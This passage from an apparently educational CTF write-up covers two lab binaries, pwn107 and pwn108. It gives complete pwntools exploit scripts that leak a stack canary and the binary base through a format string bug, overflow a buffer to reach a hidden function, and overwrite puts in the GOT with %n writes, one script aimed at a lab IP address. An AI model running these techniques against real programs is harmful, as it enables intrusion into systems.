</pre></table></code></div></div><p>Start with execution using <code class="language-plaintext highlighter-rouge">dc</code></p><p><img data-src="/assets/images/84fadebc05ea6b15b410481700f693b2710bba93532d3b146010a8d68eca22ea.png" alt="picture 54" data-proofer-ignore></p><p>As we’ve hit the breakpoint let’s read the stack using <code class="language-plaintext highlighter-rouge">pxr @ rsp</code>. Below i’ve raked the RSP and RBP pointers.<strong>Stack direction is displayed upside down!</strong></p><p><img data-src="/assets/images/f93a667e42a9f71b4699531b972234461156b87c3e97e210c6a2d9035b30b8bd.png" alt="picture 55" data-proofer-ignore></p><p>We can now see where canary and other variables are at, at this point of execution. Canary is at RBP-0x8. If we chose to overwrite it, we would also need to return back to the function (main).</p><p>We can’t use the return adress of main because this points to libc_so.6 so we need to return somewhere in the main function! We can use <code class="language-plaintext highlighter-rouge">dm</code> memory map to see to which process one address belongs.</p><p><img data-src="/assets/images/4aae335813d2d76b9addb723243dacfa8235998aa5909f040b3c1ff13d0d6f6b.png" alt="picture 56" data-proofer-ignore></p><p>We should take one that belongs to <code class="language-plaintext highlighter-rouge">pwn107.pwn107</code> and also stays on the on the stack after we write onto stack through <code class="language-plaintext highlighter-rouge">read</code> functon</p><h2 id="exploit---1st-part--format-string-vulnerability-leak">Exploit - 1st Part =&gt; Format String Vulnerability Leak<a href="#exploit---1st-part--format-string-vulnerability-leak" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now to leak simple addresses we run into how-much-space-do-we-have problem. It’s 20Bytes.</p><p><img data-src="/assets/images/4ccfd665dcddf47e054c26402243dabe967f5bca23fb7e7c6e2ebd8e1b7978a8.png" alt="picture 57" data-proofer-ignore></p><p>We leak the addresses from 6th position - Notice the 0x44434241!</p><p>If we now want to leak 7th and 11th position from top of the RSP (7th = canary, 11th = function to return to) we just need to add 6th. Let’s test this in debugger! We will leak 13th and 17th position respectively!</p><p><img data-src="/assets/images/423171e5f8615ff8aff4008fb2155d9f9e19ca3c14e32c68540dab9b26b5ea79.png" alt="picture 58" data-proofer-ignore></p><p>Now after running following script, the leaks seem right</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="s">'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
It was calculated that canary leaks at 13th position 
and the function to return to at 17th.
'''</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn107.pwn107"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># This serves just to get the offset from the start of the binary
</span><span class="n">static_libc_csu_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">__libc_csu_init</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Address of static libc csu init: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">static_libc_csu_address</span><span class="p">)))</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak?"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%13$lX.%17$lX"</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak:"</span><span class="p">)</span>

<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-src="/assets/images/675add9f7fffed28be03672bd2621505b76b7d9bee31c0502794c6b20ee0b170.png" alt="picture 59" data-proofer-ignore></p><p>To fix the formatting of the leaked addresses, script was modified.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="s">'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
IT was calculated that canary leaks at 9th position and the function to return to at 17th.
'''</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn107.pwn107"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># This serves just to get the offset from the start of the binary
</span><span class="n">static_libc_csu_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">__libc_csu_init</span>
<span class="n">static_main_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">main</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Address of static libc csu init: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">static_libc_csu_address</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Address of static main function: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">static_main_address</span><span class="p">)))</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak?"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%13$lX.%17$lX"</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">#print("Payload to leak Canary and Func: {}".format(hex(payload)))
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak:"</span><span class="p">)</span>

<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Leaked Addresses (unformated): {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">output</span><span class="p">))</span>

<span class="n">dynamic_main_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">canary_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Dynamic Libc: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">dynamic_main_address</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Canary: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary_address</span><span class="p">)))</span>

<span class="c1"># Output
#Leaked Addresses (unformated): b' 6C70AC6BD4259200.565120E00992'
#Dynamic Libc: 0x565120e00992
#Canary: 0x6c70ac6bd4259200
</span>
<span class="s">'''
In order to get the base address of the binary, we muss subtract static from dynamic address!
'''</span>

<span class="n">dynamic_base_address</span> <span class="o">=</span> <span class="n">dynamic_main_address</span> <span class="o">-</span> <span class="n">static_main_address</span>
<span class="n">binary</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">dynamic_base_address</span>

<span class="k">print</span><span class="p">(</span><span class="s">"New binary address starts now at: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">dynamic_base_address</span><span class="p">)))</span>

<span class="c1"># From this point on it's all about buffer overflow 
</span></pre></table></code></div></div><p>Important takeaway here is:</p><blockquote><p>IF we substract static base address from dynamic address that was leaked, we get a base address of the binary.</p><p>I recommend following post which explains the offsets very well: https://www.politoinc.com/post/return-to-libc-linux-exploit-development</p></blockquote><h2 id="exploit---2nd-part--buffer-overflow">Exploit - 2nd Part = Buffer Overflow<a href="#exploit---2nd-part--buffer-overflow" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Regarding Buffer oveflow this is the part where it happens:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>; var const char *format @ rbp-0x40
; var void *buf @ rbp-0x20
; var int64_t canary @ rbp-0x8
</pre></table></code></div></div><p><img data-src="/assets/images/ff2cd07c6616ccbde2c2c868d34b25c1ae9d45856d2da9ee15258c9e46cc2ac3.png" alt="picture 60" data-proofer-ignore></p><p>To recap, input will be put into <code class="language-plaintext highlighter-rouge">*buf</code> at <code class="language-plaintext highlighter-rouge">rbp-0x20</code> and up to 200 bytes can be written. At <code class="language-plaintext highlighter-rouge">rbp-0x8</code> we reach the canary, which we will need to rewrite.</p><p>To calculate the bytes we can use calculator which gives us <code class="language-plaintext highlighter-rouge">0x18</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0x20 - 0x8 = 0x18
</pre></table></code></div></div><p>Or do it with python script directly.</p><p><img data-src="/assets/images/72344b8caef9ee0c1e65d27b4f8c17f8c7ac7a2f03537fc6677e19f807c896e1.png" alt="picture 61" data-proofer-ignore></p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="s">'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
IT was calculated that canary leaks at 9th position and the function to return to at 17th.
'''</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn107.pwn107"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># This serves just to get the offset from the start of the binary
</span><span class="n">static_main_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">main</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Address of static libc csu init: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">static_libc_csu_address</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Address of static main function: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">static_main_address</span><span class="p">)))</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak?"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%13$lX.%17$lX"</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">#print("Payload to leak Canary and Func: {}".format(hex(payload)))
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"streak: "</span><span class="p">)</span>

<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Leaked Addresses (unformated): {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">output</span><span class="p">))</span>

<span class="n">dynamic_main_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">canary_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Dynamic Libc: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">dynamic_main_address</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Canary: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary_address</span><span class="p">)))</span>

<span class="c1"># Output
#Leaked Addresses (unformated): b' 6C70AC6BD4259200.565120E00992'
#Dynamic main: 0x6c70ac6bd4259200
#Canary: 0x565120e00992
</span>
<span class="s">'''
In order to get the base address of the binary, we muss subtract static from dynamic address!
'''</span>

<span class="n">dynamic_base_address</span> <span class="o">=</span> <span class="n">dynamic_main_address</span> <span class="o">-</span> <span class="n">static_main_address</span>
<span class="n">binary</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">dynamic_base_address</span>

<span class="k">print</span><span class="p">(</span><span class="s">"New binary address starts now at: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">dynamic_base_address</span><span class="p">)))</span>

<span class="c1"># From this point on it's all about buffer overflow 
# Remember, we want to get into the get_streak function!
</span><span class="n">dynamic_get_streak</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">get_streak</span>

<span class="c1">## Implant the RET Gadget since running it on Ubuntu
</span><span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">ret_gadget</span><span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary_address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">dynamic_get_streak</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></table></code></div></div><h1 id="pwn108---format-string-vulnerability---got-overwrite">PWN108 - Format String Vulnerability - GOT Overwrite</h1><p>Download the file and run it to see what we’re up against (in case we can notice something!)</p><p><img data-src="/assets/images/bad3df2a38a5a2d2fca7d8d832ab870eca5abc3ecd643db254578c977621f3f3.png" alt="picture 62" data-proofer-ignore></p><p>We are asked for 2 inputes (name, register no.). Name seems normal at the first glanze where <code class="language-plaintext highlighter-rouge">Register No.</code> leaks memory.</p><h2 id="file-5">File<a href="#file-5" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/5020644d75bce61554446bd3ba469ba66d214fef976540b620a3001db75ceeae.png" alt="picture 63" data-proofer-ignore></p><h2 id="checksec-5">Checksec<a href="#checksec-5" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/cd347b3ba2c2b0929adc197a82ea458416d15112bb70f116c8171d942f5a4513.png" alt="picture 64" data-proofer-ignore></p><h2 id="finding-the-vulnerability-decompiler">Finding the vulnerability (Decompiler)<a href="#finding-the-vulnerability-decompiler" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/736d7679c0d3a0d023dbf4020e05ab5bd202b46ea0634259ad2d844da027a270.png" alt="picture 65" data-proofer-ignore></p><p>So we’ve found the canary and where the vulnerability exists. At the end of the main function, there’s a IF statement</p><p><img data-src="/assets/images/6936014be13136c7c101733b44f7dd20bd05aeedb99e7a4a75adb7f3e612ace4.png" alt="picture 66" data-proofer-ignore></p><p>One returns to some address and another one is a fail. This is canary check, but there is another function Holidays() which has system function in it. This is where we want to return!</p><p><img data-src="/assets/images/4342c8e6e43dea09fdc5e6319ea4f03cbc15ea0533b315a2de6f09b9a0219fc3.png" alt="picture 67" data-proofer-ignore></p><p>Regarding GOT overwrite itself. We will rewrite <code class="language-plaintext highlighter-rouge">puts</code> function as it does not appear in the <code class="language-plaintext highlighter-rouge">holidays()</code> function as <code class="language-plaintext highlighter-rouge">printf</code> does!</p><h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>First we must find the position where our input get’s injected onto the stack.</p><p><img data-src="/assets/images/7d5c2a79587735883d6854d98151c05b4f60821c19c0a0170f08dbbb16002b3f.png" alt="picture 68" data-proofer-ignore></p><p>Let’s write the Puts GOT address into the 10th position using format string vulnerability</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn108.pwn108"</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># PWNTools will get the offset from the binary!
</span><span class="n">got_puts_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span>
<span class="k">print</span><span class="p">(</span><span class="s">"GOT puts address has an offset of {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">got_puts_address</span><span class="p">)))</span>

<span class="n">junk_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x12</span>
</pre></table></code></div></div><p>After Explanation from Razvi ==&gt; https://www.youtube.com/watch?v=9SWYvhY5dYw&amp;t=845s we can calculate the number of bytes to write by subtracting written bytes so far with desired value!.</p><p>Format specifier <code class="language-plaintext highlighter-rouge">%x</code> prints integers as hexadecimal!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>payload = p64(got_puts_address) + b"%10$n"
</pre></table></code></div></div><p>Since put Address has 0x00 in it, we have to turn the payload around.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>payload = b"%40X%12$nAAAAAAA" + p64(got_puts_address)
</pre></table></code></div></div><p>We need <code class="language-plaintext highlighter-rouge">AAAAAAA</code> in order to fill the bytes and with that our got_puts_address comes at the 12th position</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn108.pwn108"</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># PWNTools will get the offset from the binary!
</span><span class="n">got_puts_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span>
<span class="k">print</span><span class="p">(</span><span class="s">"GOT puts address has an offset of {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">got_puts_address</span><span class="p">)))</span>

<span class="c1">#fill the read buffer. If my understanding is correct, we could also use readuntil from pwn tools and give an input here, but result should be the same.
</span><span class="n">junk_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x12</span>

<span class="c1">#payload = p64(got_puts_address) + b"%10$n"
#Turn the address around to avoid stopping reading because of null bytes
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%40X%12$nAAAAAAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_puts_address</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">junk_payload</span><span class="p">)</span>
	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></table></code></div></div><p>The script above will write a payload to a file, which can be ingested to Radare2</p><p>Payload can be read in radare like this</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>radare2 -R stdin=payload -d -A pwn108.pwn108
</pre></table></code></div></div><p>Set breakpoints where vulnerable <code class="language-plaintext highlighter-rouge">printf</code> function resides and on the instruction after using <code class="language-plaintext highlighter-rouge">db 0x12312312</code> command.</p><p><img data-src="/assets/images/c8fce63cc3f28197ed0de54894a3c5c55e09610bcb355cc9cc808297bd67d590.png" alt="picture 69" data-proofer-ignore></p><p>We’ve hit the breakpoint. We can check if the location from puts has been filled using <code class="language-plaintext highlighter-rouge">pxr @ section..got.plt</code></p><p><img data-src="/assets/images/b7e4fa192c4436881089ede25303cbdd7647a1c629accab3ba2dca945dd2eb8d.png" alt="picture 70" data-proofer-ignore></p><p>If we continue the execution and check the puts value again in the <code class="language-plaintext highlighter-rouge">got.plt</code> we have the value that we’ve overwritten with, but only the first 4 bytes. This is because <code class="language-plaintext highlighter-rouge">%n</code> format specifier only writes 4 bytes by default.</p><p><img data-src="/assets/images/a393e13fd90085442ae4a5f6f028da815df87708b9375797bb944fd34ce0f9a5.png" alt="picture 71" data-proofer-ignore></p><p>To overwrite the full value, we just have to conduct 2 writes instead of the single one.</p><p><code class="language-plaintext highlighter-rouge">Holiday()</code> function starts at <code class="language-plaintext highlighter-rouge">0x40123b</code></p><p>To better understand this, i’ve used following resource which explains this topic really well: https://axcheron.github.io/exploit-101-format-strings/</p><p>We will rewrite the payload as following.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn108.pwn108"</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># PWNTools will get the offset from the binary!
</span><span class="n">got_puts_address</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span>
<span class="k">print</span><span class="p">(</span><span class="s">"GOT puts address has an offset of {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">got_puts_address</span><span class="p">)))</span>

<span class="c1">#fill the read buffer
</span><span class="n">junk_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x12</span>

<span class="c1">#payload = p64(got_puts_address) + b"%10$n"
#Turn the address around to avoid stopping reading because of null bytes
</span>
<span class="s">'''
Number of bytes to write = Desired value - bytes written so far

1st write = (0x40) 64 - 0 = 64
2st write = (0x123b) 4667 - 64 = 4603
'''</span>
<span class="c1">### AAA is used for padding 
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%64X%13$n"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"%4603X%14$hnAAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_puts_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_puts_address</span><span class="p">)</span>

<span class="s">'''
with open("payload", "wb") as f:
	f.write(junk_payload)
	f.write(payload)
'''</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.94.223"</span><span class="p">,</span><span class="mi">9008</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">junk_payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
